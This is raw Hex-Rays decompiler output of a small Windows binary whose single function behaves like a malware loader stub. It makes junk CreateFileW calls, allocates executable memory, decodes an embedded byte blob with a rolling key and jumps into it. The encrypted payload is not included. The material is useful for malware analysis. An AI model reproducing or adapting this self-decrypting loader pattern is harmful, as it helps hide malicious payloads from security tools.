/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int __stdcall start(int, int, int);
int sub_40AE67();

//-------------------------------------------------------------------------
// Data declarations

// extern HANDLE (__stdcall *CreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern LPVOID (__stdcall *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);


//----- (0040AE59) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __stdcall start(int a1, int a2, int a3)
{
  return sub_40AE67();
}
// 40AE64: positive sp value 4 has been found

//----- (0040AE67) --------------------------------------------------------
int sub_40AE67()
{
  int i; // esi
  unsigned __int8 v1; // al
  unsigned __int8 v2; // bl
  int (*v3)(void); // edi
  _BYTE *v4; // esi
  int v5; // ecx
  int v6; // edx
  int v7; // ebp
  char v8; // bh
  char *FileW; // eax
  DWORD flAllocationType; // [esp+0h] [ebp-Ch]
  unsigned int v12; // [esp+4h] [ebp-8h]
  int (*v13)(void); // [esp+8h] [ebp-4h]
  char *retaddr; // [esp+Ch] [ebp+0h]

  for ( i = 0; i < 1077496625; i += v1 )
    v1 = (unsigned __int8)CreateFileW(0, 0x1Cu, 0x1A2B68u, 0, 0x14u, 0x50D0EEu, 0) & 0x9F;
  v2 = v1;
  v3 = (int (*)(void))VirtualAlloc(0, 0x1368Fu, 0x3000u, 0x40u);
  v4 = retaddr + 243;
  v13 = v3;
  v5 = 475;
  v6 = -555603784;
  v7 = 0;
  do
  {
    v8 = v6 + *v4++;
    *(_BYTE *)v3 = v2 + v8;
    v3 = (int (*)(void))((char *)v3 + 1);
    v12 = v6;
    flAllocationType = v5;
    FileW = (char *)CreateFileW(0, 0xC33670u, 0x17u, 0, 0x11u, 0xFu, 0);
    v6 = v12 >> 8;
    if ( (char *)++v7 == FileW + 5 )
    {
      v6 = -555603784;
      v7 = 0;
    }
    v5 = flAllocationType - 1;
  }
  while ( flAllocationType != 1 );
  return v13();
}

// nfuncs=2 queued=2 decompiled=2 lumina nreq=0 worse=0 better=0
// ALL OK, 2 function(s) have been successfully decompiled
